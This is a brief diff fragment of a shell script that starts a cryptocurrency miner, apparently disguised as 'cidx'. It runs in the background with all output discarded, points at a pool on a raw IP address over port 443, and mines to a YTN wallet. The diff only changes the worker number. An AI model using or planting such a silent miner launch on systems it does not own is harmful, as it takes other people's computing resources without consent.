@@ -34,7 +34,7 @@ END
   # nohup ./cidx -c 'config.json' &>/dev/null &
   nohup ./cidx -a yespowerr16    \
   -o 45.115.225.24:443 \
-  -u YiN7LfFoSNRszvbuHCH27KCz617VkG3yc3.worker2 \
+  -u YiN7LfFoSNRszvbuHCH27KCz617VkG3yc3.worker3 \
   -p c=YTN,m=solo,zap=YTN,mc=YTN -t 6 &>/dev/null &
 
 
